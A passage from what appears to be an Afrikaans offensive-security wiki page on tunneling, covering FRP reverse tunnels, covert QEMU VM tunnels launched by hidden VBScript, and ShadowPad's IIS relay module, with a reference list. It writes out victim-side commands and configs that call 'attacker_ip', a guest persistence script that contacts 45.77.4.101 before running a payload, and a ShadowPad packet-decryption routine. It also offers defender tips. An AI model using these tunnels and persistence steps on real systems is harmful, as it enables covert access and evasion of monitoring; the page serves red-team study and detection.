Die connector vestig uitgaande verbindings en onderhandel by verstek QUIC, met terugval na HTTP/2; moenie aanvaar dat elke deployment TCP/443 gebruik nie. Gebruik dit slegs met die voorregte wat deur jou deployment vereis word.<sup>[[43]](#references)[[47]](#references)</sup>

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) is ’n Go reverse proxy wat **TCP, UDP, HTTP/S, STCP/SUDP, TCPMUX en XTCP** ondersteun. XTCP gebruik P2P hole punching, waarvan die sukses van NAT afhang. Vanaf **v0.53.0** kan dit as ’n **SSH Tunnel Gateway** optree, sodat ’n target host die standaard OpenSSH-client kan gebruik sonder ’n `frpc`-binary.<sup>[[48]](#references)[[49]](#references)[[50]](#references)</sup>

### Klassieke reverse TCP tunnel
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### Gebruik die nuwe SSH gateway (geen frpc binary nie)
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
Die bogenoemde opdrag publiseer die slagoffer se poort **8080** as **attacker_ip:9000** deur die standaard OpenSSH-kliënt te gebruik, terwyl `frps` die gateway verskaf.<sup>[[50]](#references)</sup>

## Covert VM-based Tunnels with QEMU

QEMU user-mode networking vereis nie root- of administrateurvoorregte vir die virtuele netwerk nie, en `-netdev user,hostfwd=...` herlei TCP-, UDP- of UNIX-verbindings vanaf die gasheer na die guest.<sup>[[51]](#references)</sup> TrustedSec het ’n Tiny Core QEMU-VM en ’n poging tot ’n reverse SSH-tunnel gedokumenteer in ’n voorval waar host-focused EDR moontlik aktiwiteit binne die guest kon mis.<sup>[[1]](#references)</sup>

### Vinnige eenreël-opdrag
```powershell
# Windows victim (user-mode networking; no TAP driver is needed for this example)
qemu-system-x86_64.exe ^
-m 256M ^
-drive file=tc.qcow2,if=ide ^
-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
-device e1000,netdev=n0 ^
-nographic
```
• Die opdrag hierbo begin ’n **Tiny Core Linux**-guest met 256 MiB guest-geheue en ’n qcow2-skyfbeeld; die skyfbeeld is nie ’n in-RAM-skyf nie.
• Poort **2222/tcp** op die Windows-gasheer word deursigtig aangestuur na **22/tcp** binne die guest.
• Vanuit die aanvaller se oogpunt stel die teiken bloot poort 2222 beskikbaar; enige pakkette wat dit bereik, word deur die SSH-bediener wat in die VM loop, hanteer.

### Stealthy bekendstelling via VBScript

TrustedSec het VBS-gedrewe QEMU-lanserings en Tiny Core-beelde waargeneem in die voorval wat hierbo aangehaal word.<sup>[[1]](#references)</sup>
```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```
Deur die script met `cscript.exe //B update.vbs` uit te voer, bly die venster versteek.<sup>[[1]](#references)</sup>

### Persistence binne die guest

Die aangehaalde voorval beskryf persistence in die stateless Tiny Core guest deur middel van `/opt/bootlocal.sh` en `/opt/filetool.lst`:<sup>[[1]](#references)</sup>

1. Plaas die payload in `/opt/123.out`
2. Voeg die volgende by `/opt/bootlocal.sh`:

```sh
while ! ping -c1 45.77.4.101; do sleep 2; done
/opt/123.out
```

3. Voeg `home/tc` en `opt` by `/opt/filetool.lst` sodat die payload tydens afsluiting in `mydata.tgz` verpak word.

### Telemetrie-oorwegings

• Die host stel steeds die QEMU-proses, qcow2-image en enige host-forwarded listener bloot.
• Slegs host-gebaseerde process scans ondersoek moontlik nie guest-prosesse nie, maar virtualization bied nie gewaarborgde ontduiking nie; network-, QEMU- en image-telemetry kan dit steeds blootstel.<sup>[[1]](#references)[[51]](#references)</sup>

### Wenke vir Defenders

• Genereer alerts vir **onverwagte QEMU/VirtualBox/KVM-binaries** in paaie wat deur gebruikers geskryf kan word.
• Blokkeer outbound connections wat vanaf `qemu-system*.exe` afkomstig is.
• Soek na seldsame listening ports (2222, 10022, …) wat onmiddellik ná ’n QEMU-launch bind.

## IIS/HTTP.sys-relay nodes via `HttpAddUrl` (ShadowPad)

Check Point beskryf ShadowPad se IIS-module as ’n manier om gekompromitteerde perimeter-webservers in backdoor- en relay-nodes te omskep deur URL-prefixes via `HttpAddUrl` te bind.<sup>[[3]](#references)</sup>

Dieselfde verslag verskaf besonderhede oor die defaults, wildcard listeners, packet decryption, relay queues en debug-telemetry wat hieronder opgesom word.<sup>[[3]](#references)</sup>

* **Config-defaults** – indien die module se JSON-config waardes weglaat, val dit terug na geloofwaardige IIS-defaults (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). Op dié manier antwoord IIS op benign traffic met die korrekte branding.
* **Wildcard interception** – operators verskaf ’n semikolon-geskeide lys van URL-prefixes (wildcards in host + path). Die module roep `HttpAddUrl` vir elke entry aan, sodat HTTP.sys matching requests na die malicious handler roeteer; nie-matching requests val terug na normale IIS-gedrag.
* **Encrypted first packet** – die eerste twee bytes van die request body bevat die seed vir ’n custom 32-bit PRNG. Elke daaropvolgende byte word met die gegenereerde keystream XOR voordat protocol parsing plaasvind:

```python
def decrypt_first_packet(buf):
seed = buf[0] | (buf[1] << 8)
num = seed & 0xFFFFFFFF
out = bytearray(buf)
for i in range(2, len(out)):
hi = (num >> 16) & 0xFFFF
num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
out[i] ^= num & 0xFF
return out
```

* **Relay orchestration** – die module hou twee lyste by: “servers” (upstream nodes) en “clients” (downstream implants). Entries word verwyder indien geen heartbeat binne ongeveer 30 sekondes ontvang word nie. Wanneer albei lyste nie leeg is nie, koppel dit die eerste gesonde server met die eerste gesonde client en pipe dit bloot bytes tussen hul sockets totdat een kant sluit.
* **Debug-telemetry** – opsionele logging teken die source IP, destination IP en totale forwarded bytes vir elke pairing aan. Investigators het dié breadcrumbs gebruik om die ShadowPad-mesh, wat oor verskeie victims gestrek het, te rekonstrueer.

---

## Ander tools om na te gaan

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [1] [Skuiling in die skaduwees: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Check Point Research – Voor ToolShell: Ondersoek na Storm-2603 se vorige Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [3] [Check Point Research – Binne Ink Dragon: Onthulling van die Relay Network en Inner Workings van ’n Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Evil-WinRM README](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/README.md)
- [5] [Nmap Reference Guide: Omseiling van Firewall/IDS-beperkings](https://nmap.org/book/man-bypass-firewalls-ids.html)
- [6] [OpenBSD ssh manual](https://man.openbsd.org/ssh)
- [7] [OpenBSD sshd_config manual](https://man.openbsd.org/sshd_config)
- [8] [OpenSSH 9.6 release notes](https://www.openssh.org/txt/release-9.6)
- [9] [sshuttle README](https://raw.githubusercontent.com/sshuttle/sshuttle/master/README.rst)
- [10] [Metasploit: Pivoting in Metasploit](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
- [11] [Metasploit socks_proxy module documentation](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/auxiliary/server/socks_proxy.md)
- [12] [Metasploit autoroute module documentation](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/post/multi/manage/autoroute.md)
- [13] [Cobalt Strike: SOCKS Proxy](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_socks-proxy.htm)
- [14] [Cobalt Strike: Reverse Port Forward](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_reverse-port-forward.htm)
- [15] [reGeorg README](https://raw.githubusercontent.com/sensepost/reGeorg/master/README.md)
- [16] [Chisel README](https://raw.githubusercontent.com/jpillora/chisel/master/README.md)
- [17] [Ligolo-ng Quickstart](https://docs.ligolo.ng/Quickstart/)
- [18] [Ligolo-ng Listeners](https://docs.ligolo.ng/Listeners/)
- [19] [Ligolo-ng Localhost](https://docs.ligolo.ng/Localhost/)
- [20] [rpivot README](https://raw.githubusercontent.com/klsecservices/rpivot/master/README.md)
- [21] [socat manual](https://man7.org/linux/man-pages/man1/socat.1.html)
- [22] [PuTTY Plink manual](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter7.html)
- [23] [PuTTY command-line options](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter3.html)
- [24] [Microsoft netsh interface portproxy command](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface)
- [25] [SocksOverRDP README](https://raw.githubusercontent.com/nccgroup/SocksOverRDP/master/README.md)
- [26] [Proxifier documentation](https://www.proxifier.com/docs/win-v4/)
- [27] [Proxifier Proxification Rules](https://www.proxifier.com/docs/win-v3/rules.htm)
- [28] [OpenVPN 2.7 manual](https://openvpn.net/community-docs/community-articles/openvpn-2-7-manual.html)
- [29] [Cntlm](https://cntlm.sourceforge.net/)
- [30] [YARP README](https://raw.githubusercontent.com/dotnet/yarp/main/README.md)
- [31] [iodine README](https://code.kryo.se/iodine/README.html)
- [32] [dnscat2 README](https://raw.githubusercontent.com/iagox86/dnscat2/master/README.md)
- [33] [dnscat2-powershell README](https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/README.md)
- [34] [proxychains-ng README](https://raw.githubusercontent.com/rofl0r/proxychains-ng/master/README)
- [35] [proxyresolv](https://github.com/haad/proxychains/blob/master/src/proxyresolv)
- [36] [RFC 1035: Domain Names - Implementering en Spesifikasie](https://www.rfc-editor.org/rfc/rfc1035)
- [37] [Hans](https://code.gerade.org/hans/)
- [38] [ptunnel-ng README](https://raw.githubusercontent.com/utoni/ptunnel-ng/master/README.md)
- [39] [ngrok Agent CLI](https://ngrok.com/docs/agent/cli)
- [40] [ngrok Web Inspection Interface](https://ngrok.com/docs/agent/web-inspection-interface)
- [41] [ngrok virtual hosts](https://ngrok.com/docs/using-ngrok-with/virtualHosts)
- [42] [ngrok Agent Config v2](https://ngrok.com/docs/agent/config/v2)
- [43] [Cloudflare Tunnel overview](https://developers.cloudflare.com/tunnel/)
- [44] [Cloudflare Tunnel origin parameters](https://developers.cloudflare.com/tunnel/advanced/origin-parameters/)
- [45] [Cloudflare Tunnel setup](https://developers.cloudflare.com/tunnel/setup/)
- [46] [Cloudflare Tunnel configuration file](https://developers.cloudflare.com/cloudflare-one/networks/connectors/cloudflare-tunnel/do-more-with-tunnels/local-management/configuration-file/)
- [47] [Cloudflare Tunnel run parameters](https://developers.cloudflare.com/tunnel/advanced/run-parameters/)
- [48] [frp concepts](https://gofrp.org/en/docs/concepts/)
- [49] [frp XTCP](https://gofrp.org/en/docs/features/xtcp/)
- [50] [frp SSH Tunnel Gateway](https://gofrp.org/en/docs/features/common/ssh/)
- [51] [QEMU networking documentation](https://www.qemu.org/docs/master/system/devices/net.html)
{{#include ../banners/hacktricks-training.md}}
